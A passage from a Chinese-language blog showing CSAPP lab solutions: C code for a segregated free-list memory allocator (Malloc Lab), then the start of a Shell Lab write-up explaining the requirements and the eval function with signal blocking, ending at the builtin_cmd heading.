class="type">size_t</span> words)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    </span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;	<span class="comment">// 保证对齐</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)	<span class="comment">// 分配空间</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));			<span class="comment">// 初始化头部和脚部</span></span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));	<span class="comment">// 初始化结尾块</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);	<span class="comment">// 前后看看有没有空闲块可以合并</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));	<span class="comment">// 得到前一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));	<span class="comment">// 得到后一个块的有效位</span></span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));	<span class="comment">// 得到当前块的大小</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块已分配，后一个块也已分配</span></span><br><span class="line">    	insert(bp);</span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;	<span class="comment">// 前一个块已分配，后一个块空闲</span></span><br><span class="line">    	delete(NEXT_BLKP(bp));	</span><br><span class="line">    	size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;	<span class="comment">// 前一个块空闲，后一个块已分配</span></span><br><span class="line">    	delete(PREV_BLKP(bp));</span><br><span class="line">    	size += GET_SIZE(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    	PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;	<span class="comment">// 前一个块空闲，后一个块也空闲</span></span><br><span class="line">    	delete(PREV_BLKP(bp));</span><br><span class="line">    	delete(NEXT_BLKP(bp));</span><br><span class="line">    	size += GET_SIZE(FTRP(PREV_BLKP(bp))) + GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    	PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    	bp = PREV_BLKP(bp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    insert(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert</span><span class="params">(<span class="type">void</span> *bp)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> index = search(size);	<span class="comment">// 寻找合适的大小类</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (GET_HEAD(index) == <span class="literal">NULL</span>) &#123;	<span class="comment">// 这个大小类为空</span></span><br><span class="line">    	PUT(GET_PRED(bp), <span class="literal">NULL</span>);	<span class="comment">// 前驱和后继指针都设置为 NULL</span></span><br><span class="line">    	PUT(GET_SUCC(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;									<span class="comment">// 这个大小类不为空</span></span><br><span class="line">    	PUT(GET_PRED(bp), <span class="literal">NULL</span>);			<span class="comment">// 前驱设置为 NULL</span></span><br><span class="line">    	PUT(GET_SUCC(bp), GET_HEAD(index));	<span class="comment">// 后继设置为大小类的头节点</span></span><br><span class="line">    	PUT(GET_PRED(GET_HEAD(index)), bp);	<span class="comment">// 大小头节点的前驱设置为当前空闲块</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    PUT(heap_listp + index * WSIZE, bp);	<span class="comment">// 重新设置大小类头节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">void</span> *bp)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> index = search(size);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (GET(GET_PRED(bp)) &amp;&amp; GET(GET_SUCC(bp))) &#123;	<span class="comment">// 前驱不为空，后继也不为空</span></span><br><span class="line">    	PUT(GET_SUCC(GET(GET_PRED(bp))), GET(GET_SUCC(bp)));</span><br><span class="line">    	PUT(GET_PRED(GET(GET_SUCC(bp))), GET(GET_PRED(bp)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (GET(GET_PRED(bp)) &amp;&amp; !GET(GET_SUCC(bp))) &#123;	<span class="comment">// 前驱不为空，后继为空</span></span><br><span class="line">    	PUT(GET_SUCC(GET(GET_PRED(bp))), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!GET(GET_PRED(bp)) &amp;&amp; GET(GET_SUCC(bp))) &#123;	<span class="comment">// 前驱为空，后继不为空</span></span><br><span class="line">	PUT(GET_PRED(GET(GET_SUCC(bp))), <span class="literal">NULL</span>);</span><br><span class="line">	PUT(heap_listp + index * WSIZE, GET(GET_SUCC(bp)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;	<span class="comment">// 前驱为空，后继也为空</span></span><br><span class="line">    	PUT(heap_listp + index * WSIZE, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tatic <span class="type">size_t</span> <span class="title function_">search</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">4</span>; i &lt; CLASS_NUM - <span class="number">1</span> + <span class="number">4</span>; ++i) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (size &lt;= (<span class="number">1</span> &lt;&lt; i)) &#123;</span><br><span class="line">    	    <span class="keyword">return</span> i - <span class="number">4</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i - <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendSize;</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) </span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size &lt;= DSIZE) &#123;	<span class="comment">// 强制最小块大小为 16 字节</span></span><br><span class="line">    	asize = <span class="number">2</span> * DSIZE;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	asize = DSIZE * ((size + DSIZE + (DSIZE - <span class="number">1</span>)) / DSIZE);	<span class="comment">// 向上取整为到最接近 8 的倍数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;	<span class="comment">// 在空闲链表中找有没有合适的空闲块</span></span><br><span class="line">    	place(bp, asize);</span><br><span class="line">    	<span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    extendSize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendSize / WSIZE)) == <span class="literal">NULL</span>)	<span class="comment">// 创建新的空闲块</span></span><br><span class="line">    	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> index = search(asize);</span><br><span class="line">    <span class="type">void</span> * bp;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (index &lt; CLASS_NUM) &#123;</span><br><span class="line">    	<span class="keyword">if</span> (GET_HEAD(index) == <span class="literal">NULL</span>) &#123;	<span class="comment">// 这个大小类为空</span></span><br><span class="line">    	    index++;</span><br><span class="line">    	    <span class="keyword">continue</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">for</span> (bp = GET_HEAD(index); bp != <span class="literal">NULL</span>; bp = (<span class="type">void</span> *)GET(GET_SUCC(bp))) &#123;<span class="comment">// 遍历这个大小类的空闲链表</span></span><br><span class="line">    	    <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp))) &#123;</span><br><span class="line">    	    	<span class="keyword">return</span> bp;</span><br><span class="line">    	    &#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= <span class="number">2</span> * DSIZE) &#123;	<span class="comment">// 如果块的剩余部分大于一个最小块的大小，那么就分割</span></span><br><span class="line">    	delete(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));	<span class="comment">// 初始化已分配块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    	bp = NEXT_BLKP(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));	<span class="comment">// 初始化分割后的空闲块</span></span><br><span class="line">    	PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">    	PUT(GET_PRED(bp), <span class="literal">NULL</span>);</span><br><span class="line">    	PUT(GET_SUCC(bp), <span class="literal">NULL</span>);</span><br><span class="line">    	insert(bp);</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	delete(bp);</span><br><span class="line">    	PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    	PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    	</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    </span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    coalesce(bp);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *oldptr = ptr;</span><br><span class="line">    <span class="type">void</span> *newptr;</span><br><span class="line">    <span class="type">size_t</span> copySize;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((newptr = mm_malloc(size)) == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    copySize = GET_SIZE(HDRP(oldptr));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (size &lt; copySize)	<span class="comment">// 保证 copySize 始终是最小的</span></span><br><span class="line">      copySize = size;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(newptr, oldptr, copySize);	<span class="comment">// 将 oldptr 指向的旧块中 copySize 个字节的值拷贝到 newptr 指向的新块</span></span><br><span class="line">    mm_free(oldptr);	<span class="comment">// 释放 oldptr 指向的旧块</span></span><br><span class="line">    <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/496366818">CSAPP | Lab8-Malloc Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://d-sketon.github.io/20220619/csapp-malloclab/">CSAPP - MallocLab | 拔剑Sketon (d-sketon.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/150100073">CSAPP:Lab5-Malloc Lab - 知乎 (zhihu.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/30/CSAPP-Lab6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/30/CSAPP-Lab6/" class="post-title-link" itemprop="url">CSAPP ShellLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-30 14:29:40" itemprop="dateCreated datePublished" datetime="2024-03-30T14:29:40+08:00">2024-03-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-31 15:44:04" itemprop="dateModified" datetime="2024-03-31T15:44:04+08:00">2024-03-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>实验讲义：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/shlab.pdf">shlab.dvi (cmu.edu)</a></p>
</li>
<li><p>这项任务的目的是更加熟悉过程控制和信号的概念，为此，您将编写一个支持作业控制的简单 Unix shell 程序</p>
</li>
<li><p>我们需要修改 <strong>tsh.c</strong> 文件，它已经包含了一些 Unix shell 功能框架，我们的任务是实现以下空余函数：</p>
<ul>
<li>eval：解析和解释命令行</li>
<li>builtin_cmd：识别和解释内置命令</li>
<li>do_bgfg：实现 bg、fg 内置命令</li>
<li>waitfg：阻塞，直到前台作业完成</li>
<li>sigchld_handler：捕获 SIGCHLD 信号</li>
<li>sigint_handler：捕获 SIGINT 信号</li>
<li>sigtstp_handler：捕获 SIGTSTP 信号</li>
</ul>
</li>
<li><p>我们的 tsh shell 应该具有以下功能：</p>
<ul>
<li><p>提示应该为字符串 “tsh&gt; ”</p>
</li>
<li><p>用户键入的命令行应由一个名称和零个或多个参数组成，所有参数都由一个或多个空格分隔；如果 name 是内置命令，则 tsh 应立即处理它并等待下一个命令行；否则，tsh 应假定 name 是可执行文件的路径，该文件在初始子进程的上下文中加载和运行</p>
</li>
<li><p>键入 ctrl-c （ctrl-z） 会导致将 SIGINT （SIGTSTP） 信号发送到当前前台作业以及该作业的任何后代。如果没有前景作业，则信号应该没有影响</p>
</li>
<li><p>如果命令行以 &amp; 结尾，则 tsh 应在后台运行作业。否则，它应该在前台运行作业</p>
</li>
<li><p>每个作业都可以通过进程 ID （PID） 或作业 ID （JID） 来标识，JID 是 tsh 分配的正整数。JID 应在命令行上用前缀 “%” 表示</p>
</li>
<li><p>tsh 应该支持以下内置命令：</p>
<ul>
<li><p>quit：终止 shell</p>
</li>
<li><p>jobs：列出所有的后台作业</p>
</li>
<li><p>bg &lt; job &gt;：通过向 &lt; job &gt; 发送 SIGCONT 信号来重启 &lt; job&gt;，然后让它在后台运行</p>
</li>
<li><p>fg &lt; job &gt;：通过向 &lt; job &gt; 发送 SIGCONT 信号来重启 &lt; job&gt;，然后让它在前台运行</p>
<blockquote>
<p>&lt; job &gt; 可以是 PID 或者 JID</p>
</blockquote>
</li>
</ul>
</li>
<li><p>tsh 应该回收它所有的僵尸子进程；如果任何作业因为收到未捕获的信号而终止，则 tsh 应识别此事件并打印一条消息，其中包含作业的 PID 和对违规信号的描述</p>
</li>
</ul>
</li>
<li><p>trace01.txt ~ trace16.txt 是测试文件，tshref 可执行文件是 tsh shell 的参考解决方案（比如应该输出什么错误信息等等）</p>
<ul>
<li><p>通过 <strong>make test&lt; x &gt;</strong> 运行我们的 tsh shell 执行 test&lt; x &gt; 测试用例，例如：make test01，make test16</p>
</li>
<li><p>通过 <strong>make rtest&lt; x &gt;</strong> 运行 tshref 执行 test &lt; x &gt; 测试用例，例如：make rtest01，make rtest16</p>
<blockquote>
<p>&lt; x &gt; 可以是 01 ~ 16</p>
</blockquote>
</li>
<li><p>比较输出结果，我们的 tsh shell 应该和 tshref 有一样的输出</p>
</li>
</ul>
</li>
<li><p>每次修改 tsh.c 时都需要通过 <strong>make</strong> 重新编译</p>
</li>
</ul>
<h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><ul>
<li>具体要求如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * eval - 评估用户刚刚键入的命令行</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果用户请求了内置命令（quit、jobs、bg 或 fg），则立即执行</span></span><br><span class="line"><span class="comment"> * 否则，创建一个子进程并在这个子进程的上下文中运行这个作业</span></span><br><span class="line"><span class="comment"> * 如果作业正在运行前台，等待它终止，然后返回</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * 每个子进程必须具有唯一的进程组 ID（JID），以便我们的后台子进程不会从内核接收 SIGINT （SIGTSTP）</span></span><br><span class="line"><span class="comment"> * 当我们在键盘上键入 Ctrl-C （Ctrl-Z） 时</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>在开始之前我们先了解一下 eval 函数需要做什么，eval 函数解析并解释命令行，这里的解析表示我们需要通过传入的命令行字符串 cmdline 得到实际的参数 argv，解释表示我们需要通过解析得到的参数 argv 创建一个新的子进程</p>
</li>
<li><p>那么怎么解析呢，也就是说怎么通过命令行字符串 cmdline 得到实际的参数 argv 呢，parseline 函数已经帮我们实现了</p>
</li>
<li><p><strong>parseline</strong> 函数根据传入的第一个参数 cmdline 将其中的实际参数提取到第二个参数 argv，并根据 cmdline 末尾是否有 &amp; 返回 1 或 0，1 表示后台 bg，0 表示前台 fg</p>
</li>
<li><p>argv 由一个名称和多个参数组成，如果 name 是内置命令，那么我们就需要立即执行这个内置命令；否则我们就将 name 视作一个可执行文件的文件名，创建新的子进程并运行这个可执行文件</p>
</li>
<li><p>因此接下来我们需要判断 argv 的 name 是不是内置命令，我们可以通过之后会实现的 builtin_cmd 函数来进行判断</p>
</li>
<li><p><strong>builtin_cmd</strong> 的逻辑是如果 argv 的 name 是内置命令，就立即执行并返回 1，否则返回 0</p>
</li>
<li><p>如果 argv 的 name 不是内置命令，那么我们就需要继续创建一个新的子进程，在创建之前我们需要考虑并发问题带来的 <strong>竞争</strong></p>
</li>
<li><p>因为创建子进程后我们会将创建的子进程添加到作业列表，如果在添加之前这个子进程就已经终止了，那么就会有一个 SIGCHILD 信号中断添加，我们会跳转到 SIGHLID 信号的处理程序（sigchld_handler 函数），在那里会回收终止的子进程（僵尸进程）并从作业列表中删除这个子进程，deletejob 什么都不会做，因为还没有添加这个子进程，控制返回到 addjob 后，我们执行了 addjob，但在这之后都不会再删除这个子进程了，这会导致巨大漏洞，这就是 addjob 和 deletejob 之间的竞争</p>
</li>
<li><p>解决方法就是在 fork 函数创建子进程之前阻塞 SIGCHLD 信号，在 addjob 之后解除阻塞，保证了将子进程添加到作业列表之后再回收子进程</p>
</li>
<li><p>在创建子进程时，需要注意的是，因为我们是在标准的 Unix shell 下运行我们的 tsh shell 的，我们的 tsh shell 其实就是那个唯一的前台作业，而 tsh shell 创建的子进程都会位于这个前台作业的进程组中，那么我们的 sigint_handler、sigtstp_handler 在将 SIGINT、SIGTSTP 信号发送给前台组的所有进程时，也会发送给 tsh shell，这显然不是我们希望看到的</p>
</li>
<li><p>解决方法是在 fork 函数之后执行 setgpid（0, 0），它会将每个子进程的进程组 ID 设置为当前子进程的 PID，这样就保证了 Unix shell 前台进程组中仅有一个进程，也就是我们的 tsh shell，而在通过 sigint_handler、sigtstp_handler 发送信号给前台进程组中的所有进程时，就可以将信号的发送给 tsh shell 前程作业的进程组，而不会发送给 tsh shell</p>
<blockquote>
<p>这里有一个小细节是：只有 tsh shell 创建的子进程会被独立出一个新的进程组，而这些子进程创建的子进程还是默认在它们的进程组中，因为它们并不执行 setpgid</p>
</blockquote>
</li>
<li><p>还有一点需要注意的是，通过 execve 函数在子进程的上下文加载并运行可执行目标文件 name 时，阻塞信息也会被继承到子进程中，因此我们需要先解除阻塞，再执行 execve 函数</p>
</li>
<li><p>创建完子进程后，在父进程 shell 中，我们还需要判断创建的子进程是前台作业还是后台作业，如果是前台作业就通过之后会实现的 waitfg 函数等待前台进程结束，如果是后台作业就输出相关的进程信息</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS];	</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];	</span><br><span class="line">    <span class="type">int</span> bg;			</span><br><span class="line">    <span class="type">pid_t</span> pid;		</span><br><span class="line">    </span><br><span class="line">    <span class="type">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);	</span><br><span class="line">    bg = parseline(buf, argv);	</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;	</span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;	</span><br><span class="line">   	</span><br><span class="line">   		sigemptyset(&amp;mask_one);</span><br><span class="line">    	sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">    	sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">    	    sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    			</span><br><span class="line">            <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    	    	perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">    	    	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   	    	&#125;</span><br><span class="line">    	    </span><br><span class="line">    	    <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;	</span><br><span class="line">    	    	<span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);	</span><br><span class="line">    	    	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    	    &#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	sigfillset(&amp;mask_all);</span><br><span class="line">    	sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    	addjob(jobs, pid, bg ? BG : FG, cmdline);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">	    	waitfg(pid);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    	<span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s\n&quot;</span>, pid2jid(pid), pid, cmdline); </span><br><span class="line">		&#125;</span><br><span class="line">   		</span><br><span class="line">        <span class="comment">// printf 是进程不安全的，所以需要在 printf 后再解除阻塞</span></span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h1><ul>
<li>具体要求如下</li>
</ul>
